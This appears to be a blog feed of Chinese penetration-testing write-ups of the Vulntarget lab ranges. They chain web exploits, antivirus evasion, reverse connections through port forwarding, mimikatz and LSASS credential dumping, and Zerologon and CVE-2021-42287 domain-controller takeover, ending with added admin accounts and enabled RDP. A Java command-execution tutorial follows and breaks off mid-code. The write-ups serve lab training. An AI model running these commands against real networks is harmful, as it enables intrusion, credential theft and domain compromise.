“<a href="http://10.0.20.100/admin/inquiries/view_details.php?id=1&quot;">http://10.0.20.100/admin/inquiries/view_details.php?id=1&quot;</a> –os-shell</p><p>查看权限，是system权限，还不错。</p><h2 id="上线msf-1"><a href="#上线msf-1" class="headerlink" title="上线msf"></a>上线msf</h2><p>利用sqlmap的文件上传尝试传马，但是失败了，看下是不是有杀软</p><p><img src="http://cdn.polowong.top/image-20220404215620615.png" alt="image-20220404215620615"></p><p>有defender，尝试免杀下</p><p>免杀过后一直无法上线，考虑是防火墙问题，修改一下，使用gost端口转发上线：</p><p>跳板机1监听5001，受害机2连接跳板机1的5001，跳板机1的5001转发至kali的5000，kali msf监听5000</p><p><img src="http://cdn.polowong.top/image-20220404225434564.png" alt="image-20220404225434564"></p><p><img src="http://cdn.polowong.top/image-20220404225447933.png" alt="image-20220404225447933"></p><h2 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>net time /domain 和net user /domain 判断后机器不在域环境</p><p><img src="http://cdn.polowong.top/image-20220404225852426.png" alt="image-20220404225852426"></p><p>添加路由，发现10.0.10.0/24网段，扫一下</p><p>发现主机10.0.10.110存活，开放了22端口</p><h2 id="凭证收集"><a href="#凭证收集" class="headerlink" title="凭证收集"></a>凭证收集</h2><p><img src="http://cdn.polowong.top/image-20220404225547746.png" alt="image-20220404225547746"></p><p>kiwi模块dump hash，解密得管理员密码Admin#123</p><h2 id="开3389"><a href="#开3389" class="headerlink" title="开3389"></a>开3389</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp&quot; &#x2F;t REG_DWORD &#x2F;v portnumber &#x2F;d 3389 &#x2F;f</span><br><span class="line">wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br><span class="line">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;v UserAuthentication &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br><span class="line">最后一句话解决mstsc报错问题</span><br></pre></td></tr></table></figure><p>上去之后发现有个mobaxterm，猜一下密码就是登陆密码，上去了</p><h1 id="内网主机2"><a href="#内网主机2" class="headerlink" title="内网主机2"></a>内网主机2</h1><p>发现mobaXterm的主机ip地址和刚才扫到的一致，双击直接登陆进去了，传一下linux_exploit_suggester试试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc cve-2021-4034-poc.c -o cve-2021-4034-poc</span><br></pre></td></tr></table></figure><h2 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h2><p><a href="https://github.com/briskets/CVE-2021-3493">https://github.com/briskets/CVE-2021-3493</a></p><p>kali编译一下然后传过去，直接提到root权限。</p><p><img src="http://cdn.polowong.top/image-20220404233528904.png" alt="image-20220404233528904"></p><h2 id="上线msf-2"><a href="#上线msf-2" class="headerlink" title="上线msf"></a>上线msf</h2><p>内网主机2 反向连接内网主机1的5005端口，内网主机1监听5005转发到外网主机5006，外网主机监听5006转发到5007，msf监听5007.</p><p>msfvenom生成的木马host写内网主机1的同网卡ip，port写5005.</p><p><img src="http://cdn.polowong.top/image-20220404235226170.png" alt="image-20220404235226170"></p><p><img src="http://cdn.polowong.top/image-20220404235208042.png" alt="image-20220404235208042"></p><p><img src="http://cdn.polowong.top/image-20220404235257440.png" alt="image-20220404235257440"></p><p>最后成功上线msf</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;外网打点&quot;&gt;&lt;a href=&quot;#外网打点&quot; class=&quot;headerlink&quot; title=&quot;外网打点&quot;&gt;&lt;/a&gt;外网打点&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://192.168.255.133/&quot;&gt;http://192.168.255.133/&lt;/a&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulntarget-a WriteUp</title>
    <link href="https://polosec.github.io/2022/03/31/Vulntarget-a-WriteUp/"/>
    <id>https://polosec.github.io/2022/03/31/Vulntarget-a-WriteUp/</id>
    <published>2022-03-31T15:11:45.000Z</published>
    <updated>2022-03-31T15:11:45.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p><a href="http://192.168.248.141/">http://192.168.248.141/</a></p><p>通达OA 直接尝试工具利用</p><p><img src="http://cdn.polowong.top/image-20220329102838067.png" alt="image-20220329102838067"></p><p>上蚁剑看到system权限。。直接不用提权了</p><p><img src="http://cdn.polowong.top/image-20220329103224207.png" alt="image-20220329103224207"></p><p>上cs进行内网渗透与信息收集</p><h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><p>上传fscan，扫了一下192.168.248网段没其他收获，扫一下另一张网卡10网段的主机</p><p>通过tailor scan 和nbtscan发现了10.0.20.99主机</p><p><img src="http://cdn.polowong.top/image-20220329105152789.png" alt="image-20220329105152789"></p><p><img src="http://cdn.polowong.top/image-20220329105204805.png" alt="image-20220329105204805"></p><h2 id="查看当前主机是否在域内"><a href="#查看当前主机是否在域内" class="headerlink" title="查看当前主机是否在域内"></a>查看当前主机是否在域内</h2><p><img src="http://cdn.polowong.top/image-20220329105324361.png" alt="image-20220329105324361"></p><p>net time /domain也报错，判断当前机器不在域内，直接打另一张网卡的99主机。</p><h2 id="凭证获取"><a href="#凭证获取" class="headerlink" title="凭证获取"></a>凭证获取</h2><p>直接mimikatz 获得密码明文 admin</p><p><img src="http://cdn.polowong.top/image-20220329105444391.png" alt="image-20220329105444391"></p><h1 id="内网主机1"><a href="#内网主机1" class="headerlink" title="内网主机1"></a>内网主机1</h1><p>ip地址10.0.20.99，从外网主机开个socks代理</p><p><img src="http://cdn.polowong.top/image-20220329105831122.png" alt="image-20220329105831122"></p><p><img src="http://cdn.polowong.top/image-20220329105841361.png" alt="image-20220329105841361"></p><p>浏览器访问20.99,hello world 扫了下目录只有phpinfo，暴露了绝对路径。 没有其他利用点，但是发现开了6379端口，</p><h2 id="方式一-绝对路径-redis写shell"><a href="#方式一-绝对路径-redis写shell" class="headerlink" title="方式一  绝对路径 redis写shell"></a>方式一  绝对路径 redis写shell</h2><p>参考链接<a href="http://wjlshare.com/archives/1283">http://wjlshare.com/archives/1283</a></p><p><img src="http://cdn.polowong.top/image-20220329213339815.png" alt="image-20220329213339815"></p><p><img src="http://cdn.polowong.top/image-20220329214114503.png" alt="image-20220329214114503"></p><p>访问1.php</p><p><img src="http://cdn.polowong.top/image-20220329214128176.png" alt="image-20220329214128176"></p><p><img src="http://cdn.polowong.top/image-20220329214343222.png" alt="image-20220329214343222"></p><p>system权限。。</p><h3 id="方式二-一键利用脚本端口转发上线"><a href="#方式二-一键利用脚本端口转发上线" class="headerlink" title="方式二 一键利用脚本端口转发上线"></a>方式二 一键利用脚本端口转发上线</h3><p>待补充，全部打完后再弄</p><h2 id="主机信息搜集"><a href="#主机信息搜集" class="headerlink" title="主机信息搜集"></a>主机信息搜集</h2><p>双网卡，10.0.20.99 10.0.10.111</p><p>查询是否在域</p><p><img src="http://cdn.polowong.top/image-20220329215118847.png" alt="image-20220329215118847"></p><p>查看域管理员</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;enterprise admins&quot;</span> /domain</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220329215346386.png" alt="image-20220329215346386"></p><p>尝试获取dc ip</p><p><img src="http://cdn.polowong.top/image-20220329215141334.png" alt="image-20220329215141334"></p><p>dc ip 10.0.10.110</p><p>看下arp缓存</p><p>无其他可用信息，fscan扫描一下，也是只有DC信息，不管了，先上cs再说。</p><h2 id="凭证收集"><a href="#凭证收集" class="headerlink" title="凭证收集"></a>凭证收集</h2><p><img src="http://cdn.polowong.top/image-20220329215759988.png" alt="image-20220329215759988"></p><p>先上传procdump dump下lsass文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit</span><br></pre></td></tr></table></figure><p>注意一点，上传的mimikatz是32位，使用掩日免杀编译的时候也是32位，但是到了本地解的时候需要使用64位的mimikatz。</p><p>解一下hash</p><p>得到主机账号密码 win2016 Admin#123</p><h2 id="上线cs"><a href="#上线cs" class="headerlink" title="上线cs"></a>上线cs</h2><p>第二台主机上线cs绕了很多弯路，说一下历程吧。</p><p>首先是win7开防火墙，win7禁用了管理员，使用cs的system权限修改管理员密码，然后3389上去编辑本地策略取消禁用管理员。</p><p>使用命令<strong>net user Administrator /active:yes</strong>激活管理员失败。</p><p>win7允许管理员登陆后，一直没上线，考虑是防火墙原因，netsh advfirewall set  currentprofile state off 关闭了win7的防火墙，同样关闭了win2016的防火墙</p><p>接下来是pivot中继上线cs，大坑，因为中继上线无法生成shellcode，但是目标主机有defender，只能想办法免杀，然而掩日并不能免杀cs的exe文件，所以只能采用<strong>web-delivery</strong>方法获取<strong>32位</strong>shellcode然后手动免杀，然而python形式的shellcode获取并解码过后shellcode格式是”\\xff”形式，需要去掉一个反斜线，要不然也上不了线，踩了大坑。获取shellcode后使用掩日免杀，<strong>编译去掉64位编译选项</strong>，生成，上传，<strong>上线</strong>。</p><p><img src="http://cdn.polowong.top/image-20220331155404810.png" alt="image-20220331155404810"></p><h1 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h1><p>根据上面收集的信息，dc为10.0.10.110，搞个代理访问到DC先,直接通过cs再开一个socks，proxifier/proxychains配置代理链</p><h3 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h3><p><img src="http://cdn.polowong.top/image-20220331222351102.png" alt="image-20220331222351102">先利用漏洞把密码重置为空，然后dump出来hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 secretsdump.py vulntarget.com&#x2F;win2019\$@10.0.10.110 -no-pass</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220331222649024.png" alt="image-20220331222649024"></p><p>然后利用smbexec拿到shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 smbexec.py  -hashes ad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 vulntarget.com&#x2F;administrator@10.0.10.110</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220331222917115.png" alt="image-20220331222917115"></p><p>添加用户，添加管理员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net user polowong Admin@polo123 &#x2F;add</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;net localgroup administrators polowong &#x2F;add</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>开3389</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp&quot; &#x2F;t REG_DWORD &#x2F;v portnumber &#x2F;d 3389 &#x2F;f</span><br><span class="line">wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220331224750967.png" alt="image-20220331224750967"></p><h3 id="hash还原"><a href="#hash还原" class="headerlink" title="hash还原"></a>hash还原</h3><p>如果机器账户<code>hash</code>长时间为空，可能会导致脱域，对内网的使用产生重大影响，因此拿到权限的第一时间需要把<code>hash</code>重置回去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后在当前shell目录生成这三个文件，c/windows/system32</p><p>通过mstsc拷回来，考到kali，使用secretdump解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220331230022740.png" alt="image-20220331230022740"></p><p>使用脚本</p><p><a href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p><p>还原hash</p><p>proxychains python3 reinstall_original_pw.py  win2019 10.0.10.110 70312b76f3ee31850203aff8c224f454</p><p><img src="http://cdn.polowong.top/image-20220331230526502.png" alt="image-20220331230526502"></p><p>可以了，测试下用原来的密码也可以登录，并且用secretdump no-pass 利用失败</p><p><img src="http://cdn.polowong.top/image-20220331230759230.png" alt="image-20220331230759230"></p><h3 id="上线cs-1"><a href="#上线cs-1" class="headerlink" title="上线cs"></a>上线cs</h3><p>一样的方法拿出shellcode然后做免杀，上传上线</p><p><img src="http://cdn.polowong.top/image-20220331230913354.png" alt="image-20220331230913354"></p><p><img src="http://cdn.polowong.top/image-20220331230922379.png" alt="image-20220331230922379"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;外网打点&quot;&gt;&lt;a href=&quot;#外网打点&quot; class=&quot;headerlink&quot; title=&quot;外网打点&quot;&gt;&lt;/a&gt;外网打点&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://192.168.248.141/&quot;&gt;http://192.168.248.141/&lt;/a&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Vulntarget-b WriteUp</title>
    <link href="https://polosec.github.io/2022/03/24/Vulntarget-b-WriteUp/"/>
    <id>https://polosec.github.io/2022/03/24/Vulntarget-b-WriteUp/</id>
    <published>2022-03-24T08:55:56.000Z</published>
    <updated>2022-03-24T08:55:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><h2 id="外部信息搜集"><a href="#外部信息搜集" class="headerlink" title="外部信息搜集"></a>外部信息搜集</h2><p>目标地址：<a href="http://192.168.248.140:81/">http://192.168.248.140:81/</a></p><p>nmap扫描后发现可利用端口为3306和81，分别是mysql与http服务</p><p><img src="http://cdn.polowong.top/image-20220323102224709.png" alt="image-20220323102224709"></p><p>发现极致cms，尝试从网上搜索相关漏洞，弱口令，默认后台地址</p><h2 id="web-cms渗透"><a href="#web-cms渗透" class="headerlink" title="web cms渗透"></a>web cms渗透</h2><p><img src="http://cdn.polowong.top/image-20220323102317983.png" alt="image-20220323102317983"></p><p>弱口令admin/admin123进入后台</p><p>进入后台后首先尝试上传，允许上传文件类型添加php后多次尝试依旧上传失败，尝试其他利用方法，参考链接<a href="https://cn-sec.com/archives/318500.html%EF%BC%8C%E4%BD%BF%E7%94%A8%E7%9A%84%E6%96%B9%E6%B3%95%E4%B8%BA%E6%B7%BB%E5%8A%A0%E6%8F%92%E4%BB%B6%E4%BF%AE%E6%94%B9%E6%A8%A1%E6%9D%BF%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%B5%8C%E5%85%A5php%E4%BB%A3%E7%A0%81%E3%80%82">https://cn-sec.com/archives/318500.html，使用的方法为添加插件修改模板代码，嵌入php代码。</a></p><p><img src="http://cdn.polowong.top/image-20220323102435446.png" alt="image-20220323102435446"></p><p><img src="http://cdn.polowong.top/image-20220323102706668.png" alt="image-20220323102706668"></p><p>配置好密码后，可以看到现在已经有了网站模板编辑权限</p><p><img src="http://cdn.polowong.top/image-20220323102745249.png" alt="image-20220323102745249"></p><p>尝试在index.php嵌入一句话木马，成功。</p><p><img src="http://cdn.polowong.top/image-20220323102853188.png" alt="image-20220323102853188"></p><p><img src="http://cdn.polowong.top/image-20220323102844337.png" alt="image-20220323102844337"></p><p>上蚁剑，可以连接，但是无法执行命令，考虑绕过disable_function</p><p><img src="http://cdn.polowong.top/image-20220323103029788.png" alt="image-20220323103029788"></p><h2 id="disable-function绕过"><a href="#disable-function绕过" class="headerlink" title="disable_function绕过"></a>disable_function绕过</h2><p>使用蚁剑插件绕过disable_function</p><p><img src="http://cdn.polowong.top/image-20220323103148822.png" alt="image-20220323103148822"></p><h2 id="主机信息搜集"><a href="#主机信息搜集" class="headerlink" title="主机信息搜集"></a>主机信息搜集</h2><p>ifconfig/ip a 无回显，先上msf看一下网络信息</p><p><img src="http://cdn.polowong.top/image-20220323110057058.png" alt="image-20220323110057058"></p><p>有两个网段，192.168.248.0/24 192.168.159.0/24</p><p>添加路由，启动socks代理</p><p><img src="http://cdn.polowong.top/image-20220323110712529.png" alt="image-20220323110712529"><img src="http://cdn.polowong.top/image-20220323110727447.png" alt="image-20220323110727447"></p><p>配置proxifier，尝试访问159网段</p><p><img src="http://cdn.polowong.top/image-20220323111007864.png" alt="image-20220323111007864"></p><p>没问题，进行159网段的信息搜集</p><p>使用TailorScan</p><p><img src="http://cdn.polowong.top/image-20220323124220309.png" alt="image-20220323124220309"></p><p>发现192.168.159.129:8080</p><p>访问发现是禅道CMS</p><h1 id="内网主机1"><a href="#内网主机1" class="headerlink" title="内网主机1"></a>内网主机1</h1><p>192.168.159.129主机开放了8080与3306端口，分别是http与mysql服务，8080端口部署了禅道系统。</p><h2 id="web-渗透"><a href="#web-渗透" class="headerlink" title="web 渗透"></a>web 渗透</h2><p>漏洞利用：<a href="https://blog.csdn.net/qq_36197704/article/details/109385695">https://blog.csdn.net/qq_36197704/article/details/109385695</a></p><p>弱口令admin/Admin123进入后台</p><p>由于漏洞利用需要访问服务器文件，该主机不出网，所以需要在第一台centos起一个web服务放payload</p><p>python -m SimpleHTTPServer 1234</p><p><img src="http://cdn.polowong.top/image-20220323125354747.png" alt="image-20220323125354747"></p><p>访问后文件存在，进行下一步利用</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.129:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=SFRUUDovLzE5Mi4xNjguMTU5LjEzMDoxMjM0LzEucGhw</span><br></pre></td></tr></table></figure><p>上传完成后尝试访问</p><p><a href="http://192.168.159.129:8080/data/client/1/1.php">http://192.168.159.129:8080/data/client/1/1.php</a></p><p><img src="http://cdn.polowong.top/image-20220323125714445.png" alt="image-20220323125714445"></p><p>没问题，上蚁剑</p><p><img src="http://cdn.polowong.top/image-20220323140808768.png" alt="image-20220323140808768"></p><h2 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h2><p>看一下有哪些杀软 tasklist /svc 然后掩日识别一下</p><p><img src="http://cdn.polowong.top/image-20220323142255471.png" alt="image-20220323142255471"></p><p>发现有火绒，尝试上一下msf，由于该机器不出外网，需要在centos使用ew做一下端口转发，并且需要对生成的shellcode进行免杀。</p><h3 id="msf免杀火绒"><a href="#msf免杀火绒" class="headerlink" title="msf免杀火绒"></a>msf免杀火绒</h3><p>使用掩日进行免杀</p><p><img src="http://cdn.polowong.top/image-20220323150056402.png" alt="image-20220323150056402"></p><h3 id="centos配置端口转发"><a href="#centos配置端口转发" class="headerlink" title="centos配置端口转发"></a>centos配置端口转发</h3><p>弱口令ssh进去centos，systemctl stop firewalld.service 关闭防火墙,使用gost进行端口转发</p><p><img src="http://cdn.polowong.top/image-20220323195150318.png" alt="image-20220323195150318"></p><p>centos 1235端口收到的请求将转发至248.133主机的8887端口</p><p><img src="http://cdn.polowong.top/image-20220323150820641.png" alt="image-20220323150820641"></p><p><img src="http://cdn.polowong.top/image-20220323150831092.png" alt="image-20220323150831092"></p><p>运行exe文件</p><p><img src="http://cdn.polowong.top/image-20220323150857570.png" alt="image-20220323150857570"></p><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p>run post/windows/manage/migrate  自动迁移进程</p><h3 id="添加路由与收集网段信息"><a href="#添加路由与收集网段信息" class="headerlink" title="添加路由与收集网段信息"></a>添加路由与收集网段信息</h3><p>可以看到有10.0.10.0/24网段信息，添加路由</p><p><img src="http://cdn.polowong.top/image-20220323195308599.png" alt="image-20220323195308599"></p><p>上传fscan收集信息</p><p><img src="http://cdn.polowong.top/image-20220323195954548.png" alt="image-20220323195954548"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>尝试了几个suggester提供的方法均失败，直接getsystem就可以了，昨天提权失败应该是因为msf没更新</p><p><img src="http://cdn.polowong.top/image-20220324125109952.png" alt="image-20220324125109952"></p><h2 id="dump-hash"><a href="#dump-hash" class="headerlink" title="dump hash"></a>dump hash</h2><p>dump hash需要管理员权限，所以上一步提权，手动尝试添加用户被火绒拦截了，所以只能dump hash</p><p>load kiwi</p><p>creds_all</p><p><img src="http://cdn.polowong.top/image-20220324125928821.png" alt="image-20220324125928821"></p><p>去解一下NTLM HASH</p><p><a href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p><p><img src="http://cdn.polowong.top/image-20220324130046556.png" alt="image-20220324130046556"></p><p>得到密码admin#123,尝试远程桌面登录</p><p><img src="http://cdn.polowong.top/image-20220324130559762.png" alt="image-20220324130559762"></p><p>run post/windows/manage/enable_rdp</p><p><img src="http://cdn.polowong.top/image-20220324130923270.png" alt="image-20220324130923270"></p><p>登陆不上，没有授权，没办法只能去打域控了</p><h2 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h2><p>ip地址10.0.10.99</p><p>arp表</p><p><img src="http://cdn.polowong.top/image-20220324140502446.png" alt="image-20220324140502446"></p><p>fscan信息</p><p><img src="http://cdn.polowong.top/image-20220324140634638.png" alt="image-20220324140634638"></p><p>可以看到已经定位出了DC</p><h3 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h3><p>参考</p><p><a href="https://security.tencent.com/index.php/blog/msg/154">https://security.tencent.com/index.php/blog/msg/154</a></p><p>net user /domain</p><p>net time /domain</p><p><img src="http://cdn.polowong.top/image-20220324140716143.png" alt="image-20220324140716143"></p><p>ping一下DC，得到IP地址，可以看到与fscan的扫描结果一致。</p><p><img src="http://cdn.polowong.top/image-20220324141003488.png" alt="image-20220324141003488"></p><h1 id="域控"><a href="#域控" class="headerlink" title="域控"></a>域控</h1><h2 id="CVE-2021-42287"><a href="#CVE-2021-42287" class="headerlink" title="CVE-2021-42287"></a>CVE-2021-42287</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;WazeHell&#x2F;sam-the-admin.git</span><br><span class="line">python3 -m pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>这个脚本只能在kali使用，kali自带了smbexec</p><p>需要修改源码</p><p><img src="http://cdn.polowong.top/image-20220324144058617.png" alt="image-20220324144058617"></p><p>proxychains python3 sam_the_admin.py “vulntarget.com/win101:admin#123” -dc-ip 10.0.10.100 -shell</p><p><img src="http://cdn.polowong.top/image-20220324144134296.png" alt="image-20220324144134296"></p><h2 id="开3389"><a href="#开3389" class="headerlink" title="开3389"></a>开3389</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\TerminalServer\WinStations\RDP-Tcp&quot; &#x2F;t REG_DWORD &#x2F;v portnumber &#x2F;d 3389 &#x2F;f</span><br><span class="line">wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220324144424453.png" alt="image-20220324144424453"></p><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><p>net user polo admin@123 /add</p><p>net localgroup administrators polo /add</p><p><img src="http://cdn.polowong.top/image-20220324144755692.png" alt="image-20220324144755692"></p><p>使用kali的remmina工具登录，mstsc应该是因为ssl配置问题上不去</p><p><img src="http://cdn.polowong.top/image-20220324150243048.png" alt="image-20220324150243048"></p><h3 id="dump-hash-1"><a href="#dump-hash-1" class="headerlink" title="dump hash"></a>dump hash</h3><p>上传procdump，利用42287获得的shell执行下面命令</p><p>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</p><p>然后将得到的lsass.dmp文件拷贝至本地</p><p>本地执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &#96;&#96;&quot;sekurlsa::minidump lsass.dmp&quot;&#96; &#96;&quot;sekurlsa::logonPasswords full&quot;&#96; &#96;exit</span><br></pre></td></tr></table></figure><p><img src="http://cdn.polowong.top/image-20220324164849442.png" alt="image-20220324164849442"></p><p>拿到NTLM-hash结果，尝试解密Administrator 570a9a65db8fba761c1008a51d4c95ab</p><p><img src="http://cdn.polowong.top/image-20220324164957859.png" alt="image-20220324164957859"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;外网打点&quot;&gt;&lt;a href=&quot;#外网打点&quot; class=&quot;headerlink&quot; title=&quot;外网打点&quot;&gt;&lt;/a&gt;外网打点&lt;/h1&gt;&lt;h2 id=&quot;外部信息搜集&quot;&gt;&lt;a href=&quot;#外部信息搜集&quot; class=&quot;headerlink&quot; title=&quot;外部信息搜</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Java安全基础-反射学习</title>
    <link href="https://polosec.github.io/2022/03/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0/"/>
    <id>https://polosec.github.io/2022/03/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0/</id>
    <published>2022-03-07T16:29:14.000Z</published>
    <updated>2022-03-07T16:30:27.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java执行系统命令"><a href="#Java执行系统命令" class="headerlink" title="Java执行系统命令"></a>Java执行系统命令</h1><h2 id="cmd相关参数"><a href="#cmd相关参数" class="headerlink" title="cmd相关参数"></a>cmd相关参数</h2><p>cmd /c dir 是执行完dir命令后关闭命令窗口。 </p><p>cmd /k dir 是执行完dir命令后不关闭命令窗口。 </p><p>cmd /c start dir 会打开一个新窗口后执行dir指令，原窗口会关闭。 </p><p>cmd /k start dir 会打开一个新窗口后执行dir指令，原窗口不会关闭。</p><h2 id="windows下执行命令的几种方式"><a href="#windows下执行命令的几种方式" class="headerlink" title="windows下执行命令的几种方式"></a>windows下执行命令的几种方式</h2><ol><li>Windows下调用程序</li></ol><blockquote><p>Process proc =Runtime.getRuntime().exec(“exefile”);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Process proc1 =Runtime.getRuntime().exec(<span class="string">&quot;notepad&quot;</span>);</span><br></pre></td></tr></table></figure></blockquote><ol><li>Windows下调用系统命令</li></ol><blockquote><p>String [] cmd={“cmd”,”/C”,”copy exe1 exe2”};<br>Process proc =Runtime.getRuntime().exec(cmd);</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">String cmd[]=&#123;<span class="string">&quot;cmd&quot;</span>,<span class="string">&quot;/c&quot;</span>,<span class="string">&quot;whoami&quot;</span>&#125;;</span><br><span class="line">   Process proc2=Runtime.getRuntime().exec(cmd);</span><br><span class="line">      InputStream is=proc2.getInputStream();</span><br><span class="line">      BufferedReader br=<span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line">      String res;</span><br><span class="line">      <span class="keyword">while</span> ((res=br.readLine())!=<span class="keyword">null</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          